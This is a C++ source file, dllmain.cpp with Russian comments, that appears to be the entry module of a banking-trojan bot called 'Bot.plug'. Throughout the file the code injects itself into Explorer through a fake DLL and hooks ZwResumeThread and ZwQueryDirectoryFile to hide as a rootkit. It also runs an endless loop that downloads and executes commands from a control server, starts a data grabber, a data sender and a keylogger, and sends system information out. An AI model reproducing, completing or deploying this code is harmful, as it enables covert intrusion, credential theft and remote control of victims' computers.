// dllmain.cpp: определяет точку входа для приложения DLL.
#include "stdafx.h"
#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Task.h"
#include "BotEvents.h"
#include "Loader.h"
#include "Config.h"
#include "BotCore.h"


#include "Crypt.h"

#include "Modules.h"

#include "ntdll.h"

#include "coocksol.h"

#include "md5.h"

#include "DbgRpt.h"

//#pragma comment(linker, "/ENTRY:MyDllMain" )

//------------------------------------------------------------------------------
//  Система отладочных строк
//------------------------------------------------------------------------------
#include "BotDebug.h"

namespace DLLDBGTEMPLATES
{
#include "DbgTemplates.h"
}

#define DLLDBG DLLDBGTEMPLATES::DBGOutMessage<>


//------------------------------------------------------------------------------


//-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	

WCHAR TempFileName[ MAX_PATH ]; //темп файл для добавления в автозагрузку

DWORD dwKillPid		 = 0; //пид для убийства процесса бота
DWORD dwFirst	     = 0; //запуск в первый раз
DWORD dwAlreadyRun   = 0; //если уже запущены
DWORD dwGrabberRun	 = 0; //отработал ли граббер
DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
DWORD dwWebMoneySelf = 0;

//DWORD dwExplorerPid  = 0; //пид эксплорера

// Ф-ция для захвата мьютекса 
// Нужна для обеспечения единственного запуска чего-либо
bool TryToCatchHostLevelInstanceMutex(const char* MutexPrefix)
{
	CHAR mutex_name[200];

	m_memset(mutex_name, 0, sizeof(mutex_name));

	PCHAR machine_id = MakeMachineID();
	m_lstrcat(mutex_name, "Global\\");
	m_lstrcat(mutex_name, MutexPrefix);
	m_lstrcat(mutex_name, machine_id);

	STR::Free(machine_id);

	DLLDBG("TryToCatchHostLevelInstanceMutex", "Mutex name '%s'.", mutex_name);

	SECURITY_ATTRIBUTES sa;
	SECURITY_DESCRIPTOR sd;

	pInitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
	pSetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

	sa.nLength = sizeof (SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = &sd;
	sa.bInheritHandle = FALSE;

	HANDLE mutex_handle = (HANDLE)pCreateMutexA(&sa, FALSE, mutex_name);
	if (mutex_handle == NULL) return false;

	// Catch ownership of mutex and never release
	DWORD wait_result = (DWORD)pWaitForSingleObject(mutex_handle, 1000);
	if (wait_result == WAIT_OBJECT_0) return true;

	pCloseHandle(mutex_handle);
	return false;
}


DWORD WINAPI LoaderRoutine(LPVOID Data)
{
	DLLDBG("====>Bot DLL", "-------- LoaderRoutine (v10)");

	BOT::Initialize();
	//UnhookDlls();

	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();

	// Регистрируем глобальный менеджер задач
	InitializeTaskManager(NULL, true);

	// Инициализируем систему отправки статистической информации
	DebugReportInit();

	// 402_pl запуск цикла получения команд (он получается в другом процессе)
	DebugReportStepByName("402_pl");

	// Вызываем событие
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		return 0; 
	}




	// Запускаем поток отправки данных
	DataGrabber::StartDataSender();

	// Стартуем поток обновления списка процессов кейлогера
	#ifdef UniversalKeyLoggerH
		KeyLogger::StartProcessListDownloader();
	#endif


	bool FirstSended = false;
	
	DLLDBG("====>Bot Loader", "Стартуем выполнение команд");
	while (true)
	{
		// 403_pl цикл получения команд
		DebugReportStepByName("403_pl");
		
		DownloadAndExecuteCommand(NULL, NULL);

		// "Гениальность" проектирования взаимосвязи бота и его сервера
		// отправка стартовой информации должна идти только после получения
		// команды
		if (!FirstSended)
		{
			DLLDBG("====>Bot Loader", "Отправляем информацию о системе");
			FirstSended = SendFirstInfo();
		}


		// Приостанавливаем выполнение команд
		if (!TaskManagerSleep(NULL))
			break;
	}

	return 0;
}

DWORD WINAPI ExplorerMain(LPVOID Data)
{
	BOT::Initialize();

	// Пробуем захватить мьютекс для обеспечения единственного Bot.plug
	// в explorer
	bool Catched = TryToCatchHostLevelInstanceMutex("bplfklexpl");

	DLLDBG("ExplorerMain", "TryToCatchHostLevelInstanceMutex() result=%d", Catched);
	if (Catched == false) return 0;

	DLLDBG("====>Bot DLL", "Запускаем бот. Префикс [%s]", GetPrefix().t_str());
	
	//UnhookDlls();

	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();

	// Инициализируем систему отправки статистической информации
	DebugReportInit();

	HookZwResumeThread();
	HookZwQueryDirectoryFile();

	// 401_pl запуск BotPlug
	DebugReportStepByName("401_pl");

		
	DLLDBG("====>Bot DLL", "Стартуем Loader");
	MegaJump( LoaderRoutine );

	
	#ifdef GrabberH
		if ( dwFirst && !dwGrabberRun ) 
		{
			DLLDBG("====>Bot DLL", "Стартуем грабер");
			MegaJump( GrabberThread );
		}
	#endif

	//MegaJump(AvFuckThread);


	// Вызываем событие мтарта експлорера

//	if (dwFirst)
//		ExplorerFirstStart(NULL);


	ExplorerStart(NULL);


	return 0;
}


extern"C"  void WINAPI Start(LPVOID, LPVOID, LPVOID)
{
	StartThread(ExplorerMain, NULL);
}


// Ф-ция для прыжка в Explorer при загрузке из StartFromFakeDll
DWORD WINAPI ExplorerRoutine( LPVOID lpData )
{
	// При загрузке просто вызывает Start, предусмотренную для 
	// обычного запуска Bot.plug
	Start(NULL, NULL, NULL);
	return 0;
}

// Експортируемая ф-ция для запуска Bot.plug из FakeDll.
BOOL WINAPI StartFromFakeDll()
{
	DLLDBG("StartFromFakeDll", "Started.");
	
	// Пробуем захватить мьютекс для обеспечения единственного запуска StartFromFakeDll
	// Если одновременно работает несколько процесов.
	bool Catched = TryToCatchHostLevelInstanceMutex("bplfkl");
	DLLDBG("StartFromFakeDll", "TryToCatchHostLevelInstanceMutex() result=%d", Catched);

	if (Catched == false) return FALSE;

	InjectIntoExplorer(ExplorerRoutine);

	return FALSE;
}
